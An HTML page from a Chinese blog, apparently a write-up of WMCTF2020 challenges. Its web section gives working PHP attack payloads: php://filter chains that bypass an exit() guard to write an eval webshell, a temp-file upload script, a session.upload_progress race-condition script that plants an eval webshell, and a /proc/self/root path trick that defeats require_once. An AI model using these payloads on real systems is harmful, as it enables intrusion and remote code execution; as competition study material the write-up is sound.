@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yuhaojiang.gitee.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="前言不会做，好多知识盲点🙃 webweb_checkin源码为 123456789101112131415 &lt;?php&#x2F;&#x2F;PHP 7.0.33 Apache&#x2F;2.4.25error_reporting(0);$sandbox &#x3D; &amp;#x27;&#x2F;var&#x2F;www&#x2F;html&#x2F;&amp;#x27; . md5($_SERVER[&amp;#x27;REMOTE_ADDR&amp;#x27;]);@mkdir($sandb">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WMCTF2020">
+<meta property="og:url" content="https://yuhaojiang.gitee.io/2020/08/06/WMCTF2020/index.html">
+<meta property="og:site_name" content="kawhi的博客">
+<meta property="og:description" content="前言不会做，好多知识盲点🙃 webweb_checkin源码为 123456789101112131415 &lt;?php&#x2F;&#x2F;PHP 7.0.33 Apache&#x2F;2.4.25error_reporting(0);$sandbox &#x3D; &amp;#x27;&#x2F;var&#x2F;www&#x2F;html&#x2F;&amp;#x27; . md5($_SERVER[&amp;#x27;REMOTE_ADDR&amp;#x27;]);@mkdir($sandb">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-08-05T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-10-16T03:52:45.142Z">
+<meta property="article:author" content="kawhi">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://yuhaojiang.gitee.io/2020/08/06/WMCTF2020/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>WMCTF2020 | kawhi的博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">kawhi的博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://yuhaojiang.gitee.io/2020/08/06/WMCTF2020/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="http://yuhaojiang.gitee.io/picture/Blog头像.jpg">
+      <meta itemprop="name" content="kawhi">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="kawhi的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          WMCTF2020
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-08-06 00:00:00" itemprop="dateCreated datePublished" datetime="2020-08-06T00:00:00+08:00">2020-08-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-10-16 11:52:45" itemprop="dateModified" datetime="2020-10-16T11:52:45+08:00">2020-10-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF%E6%AF%94%E8%B5%9B/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h1><p>不会做，好多知识盲点🙃</p>
+<h1 id="web"><a href="#web" class="headerlink" title="web"></a><strong>web</strong></h1><h2 id="web-checkin"><a href="#web-checkin" class="headerlink" title="web_checkin"></a><strong>web_checkin</strong></h2><p>源码为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//PHP 7.0.33 Apache/2.4.25</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$sandbox = <span class="string">&#x27;/var/www/html/&#x27;</span> . md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;content&#x27;</span>])) &#123;</span><br><span class="line">    $content = $_GET[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/iconv|UCS|UTF|rot|quoted|base64/i&#x27;</span>,$content))</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(file_exists($content))</span><br><span class="line">        <span class="keyword">require_once</span>($content);</span><br><span class="line">    file_put_contents($content,<span class="string">&#x27;&lt;?php exit();&#x27;</span>.$content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里可以先学习P神的死亡exit的绕过：<a class="foo" target="_blank" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php://filter的妙用</a></p>
+<p>这里的话看到<code>file_put_contents()</code>一般就是写shell了，但是因为前面有<code>exit()</code>导致即使我们成功写入一句话，也执行不了，一般来说可以用base64可以直接绕过，如：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=convert.base64-decode/resource=shell.php</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php</span><br></pre></td></tr></table></figure>
+
+<p>先<code>strip_tags</code>去除死亡<code>exit</code>，再将<code>webshell</code>用<code>base64-decode</code>还原</p>
+<p>又或者</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=string.rot13/resource=shell.php</span><br></pre></td></tr></table></figure>
+
+<p>原理和上面类似，核心是将”死亡exit”去除。<code>&lt;?php exit; ?&gt;</code>在经过rot13编码后会变成<code>&lt;?cuc rkvg; ?&gt;</code>，</p>
+<p>如果我们上传<code>&lt;?cuc cucvasb();?&gt;</code>，经过rot13编码后会变成<code>&lt;?php phpinfo();?&gt;</code>。</p>
+<p>这就是P神的三种绕过exit的方法，但是题目过滤了<code>rot</code>，<code>base64</code>，以及<code>file_put_contents($content,&#39;&lt;?php exit();&#39;.$content);</code>，前后两个地方都是content，所以这题的解法要改一下。</p>
+<p>一般来说往文件里面写东西并绕过exit是这样的</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?content=php://filter/write=string.strip_tags/some_thing/resource=1.php</span><br></pre></td></tr></table></figure>
+
+<p>比如说写一个<code>.htaccess</code>(这里参考hhhm师傅博客)</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?content=php://filter/write=string.strip_tags/?&gt;AddType application/x-httpd-php .jpg%0aphp_value auto_append_file &#x27;php://filter/convert.ba\%0Ase64-decode/reso\%0Aurce=a.jpg&#x27;%0A%23/resource=.htaccess</span><br></pre></td></tr></table></figure>
+
+<p>会得到</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br><span class="line">php_value auto_append_file <span class="string">&#x27;php://filter/convert.ba\</span></span><br><span class="line"><span class="string">se64-decode/reso\</span></span><br><span class="line"><span class="string">urce=a.jpg&#x27;</span></span><br><span class="line"><span class="comment">#/resource=.htaccess</span></span><br></pre></td></tr></table></figure>
+
+<p>前置知识看好后，下面是官方的解法了。</p>
+<h3 id="二次编码绕过"><a href="#二次编码绕过" class="headerlink" title="二次编码绕过"></a><strong>二次编码绕过</strong></h3><p><code>file_put_contents</code>中可以调用伪协议，而伪协议处理时会对过滤器urldecode一次，所以是可以利用二次编码绕过的，不过%25被ban了，测试%25被ban后就可以写个脚本跑一下字符，构造一些过滤的字符就可以利用正常的姿势绕过。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$char = <span class="string">&#x27;r&#x27;</span>; <span class="comment">#构造r的二次编码 </span></span><br><span class="line"><span class="keyword">for</span> ($ascii1 = <span class="number">0</span>; $ascii1 &lt; <span class="number">256</span>; $ascii1++) &#123; </span><br><span class="line">    <span class="keyword">for</span> ($ascii2 = <span class="number">0</span>; $ascii2 &lt; <span class="number">256</span>; $ascii2++) &#123; </span><br><span class="line">        $aaa = <span class="string">&#x27;%&#x27;</span>.$ascii1.<span class="string">&#x27;%&#x27;</span>.$ascii2; </span><br><span class="line">        <span class="keyword">if</span>(urldecode(urldecode($aaa)) == $char)&#123; </span><br><span class="line">            <span class="keyword">echo</span> $char.<span class="string">&#x27;: &#x27;</span>.$aaa; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=string.%7%32ot13|&lt;?cuc cucvasb();?&gt;|/resource=Cyc1e.php </span><br><span class="line"><span class="comment">#Cyc1e.php </span></span><br><span class="line">&lt;?cuc rkvg();cuc://svygre/jevgr=fgevat.%72bg13|&lt;?php phpinfo();?&gt;|/erfbhepr=Plp1r.cuc </span><br></pre></td></tr></table></figure>
+
+<h3 id="过滤器绕过"><a href="#过滤器绕过" class="headerlink" title="过滤器绕过"></a><strong>过滤器绕过</strong></h3><p>题目中过滤的过滤器有</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/iconv|UCS|UTF|rot|quoted|base64/ </span><br></pre></td></tr></table></figure>
+
+<p>预留了zlib、bzip2、string等过滤器， <code>php:filter</code> 支持使用多个过滤器，所以可以利用 <code>zlib</code> 的 <code>zlib.deflate</code> 和 <code>zlib.inflate</code> 来做，压缩后再解压后内容肯定不变，可以在中间遍历一下剩下的几个过滤器，看看中间操作时候是否会影响后续inflate的内容，简单遍历一下可以发现中间插入string.tolower转后会把空格和exit处理了就可以绕过exit</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0deval($_GET[1]);?&gt;/resource=Cyc1e.php </span><br></pre></td></tr></table></figure>
+
+<p>会生成这个</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php@…xit();php://fil|mr/zlib.lmfla|m|s|ring.|olowmr|zlib.infla|m|?&gt;&lt;?php</span><br><span class="line">eval($_GET[1]);?&gt;/vesouvce=Cyc1e.&lt;?p</span><br></pre></td></tr></table></figure>
+
+<h3 id="爆破临时文件"><a href="#爆破临时文件" class="headerlink" title="爆破临时文件"></a><strong>爆破临时文件</strong></h3><p>环境特地设置了php 7.0.33版本，由于file_put_contents也可以利用伪协议，所以老问题，利用string.strip_tags会发生段错误，这时候上传一个shell会以临时文件的形式保存在/tmp中，利用require_once包含getshell即可。</p>
+<p>脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line">​</span><br><span class="line">charset = string.digits + string.letters</span><br><span class="line">​</span><br><span class="line">host = <span class="string">&quot;web_checkin2.wmctf.wetolink.com&quot;</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line">base_url = <span class="string">&quot;http://%s:%d&quot;</span> % (host, port)</span><br><span class="line">​</span><br><span class="line">​</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file_to_include</span>(<span class="params">url, file_content</span>):</span></span><br><span class="line">    files = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;evil.jpg&#x27;</span>, file_content, <span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url, files=files)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> e</span><br><span class="line">​</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_tmp_files</span>():</span></span><br><span class="line">    file_content = <span class="string">&#x27;&lt;?php system(&quot;xxxxxxxx&quot;);?&gt;&#x27;</span></span><br><span class="line">    phpinfo_url = <span class="string">&quot;%s/?content=php://filter/write=string.strip_tags/resource=Cyc1e.php&quot;</span> % (</span><br><span class="line">        base_url)</span><br><span class="line">    <span class="keyword">print</span> phpinfo_url</span><br><span class="line">    length = <span class="number">6</span></span><br><span class="line">    times = len(charset) ** (length / <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(times):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;[+] %d / %d&quot;</span> % (i, times)</span><br><span class="line">        upload_file_to_include(phpinfo_url, file_content)</span><br><span class="line">​</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    generate_tmp_files()</span><br></pre></td></tr></table></figure>
+
+<h2 id="Make-PHP-Great-Again"><a href="#Make-PHP-Great-Again" class="headerlink" title="Make PHP Great Again"></a><strong>Make PHP Great Again</strong></h2><p>源码为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">require_once</span> $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里因为<code>flag.php</code>被<code>require_once</code>包含过一次了，所以下面如果用伪协议去读的话，是读取不到flag.php的内容的。第一个版本存在非预期：session.upload_progress</p>
+<p>具体可以参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a></p>
+<p>脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">sessid = <span class="string">&#x27;TGAO&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;system(&#x27;cat flag.php&#x27;);&quot;</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = session.post(<span class="string">&#x27;http://no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com&#x27;</span>, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;tgao.txt&#x27;</span>,f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125; )</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(<span class="string">&#x27;http://no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com/index.php?file=/tmp/sess_&#x27;</span>+sessid,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;tgao.txt&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            print(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;[+++++++++++++]retry&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>): </span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">    event.set()</span><br></pre></td></tr></table></figure>
+
+<p>原理就是利用的是条件竞争，上传一个足够大的文件增加session文件的存在时间使得包含成功。</p>
+<h2 id="Make-PHP-Great-Again2"><a href="#Make-PHP-Great-Again2" class="headerlink" title="Make PHP Great Again2"></a><strong>Make PHP Great Again2</strong></h2><p>PHP最新版 的小 Trick， require_once 包含的软链接层数较多事 once 的 hash 匹配会直接失效造成重复包含。</p>
+<p>payload</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com/?file=php://filter/read=convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure>
+
+<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a><strong>misc</strong></h1><h2 id="Happy-birthday"><a href="#Happy-birthday" class="headerlink" title="Happy_birthday!"></a><strong>Happy_birthday!</strong></h2><p>打开题目看到文件名”daolnwod.zip”，看到文件结尾的4B 50不难想到将文件reverse后就能得到压缩包和flag </p>
+<p>脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">f = open(<span class="string">&#x27;daolnwod.zip&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">f = f[::<span class="number">-1</span>]</span><br><span class="line">f2 = open(<span class="string">&#x27;flag.zip&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(f)</span><br></pre></td></tr></table></figure>
+
+<p>解压即可得到flag。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/07/27/%E6%90%AD%E5%BB%BA%E5%8A%A8%E6%80%81CTFd/" rel="prev" title="搭建动态CTFd">
+      <i class="fa fa-chevron-left"></i> 搭建动态CTFd
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/08/22/ciscn%E5%88%9D%E8%B5%9B/" rel="next" title="ciscn初赛">
+      ciscn初赛 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web"><span class="nav-number">2.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web-checkin"><span class="nav-number">2.1.</span> <span class="nav-text">web_checkin</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-number">2.1.1.</span> <span class="nav-text">二次编码绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8%E7%BB%95%E8%BF%87"><span class="nav-number">2.1.2.</span> <span class="nav-text">过滤器绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%88%86%E7%A0%B4%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6"><span class="nav-number">2.1.3.</span> <span class="nav-text">爆破临时文件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Make-PHP-Great-Again"><span class="nav-number">2.2.</span> <span class="nav-text">Make PHP Great Again</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Make-PHP-Great-Again2"><span class="nav-number">2.3.</span> <span class="nav-text">Make PHP Great Again2</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#misc"><span class="nav-number">3.</span> <span class="nav-text">misc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Happy-birthday"><span class="nav-number">3.1.</span> <span class="nav-text">Happy_birthday!</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="kawhi"
+      src="http://yuhaojiang.gitee.io/picture/Blog头像.jpg">
+  <p class="site-author-name" itemprop="name">kawhi</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">23</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
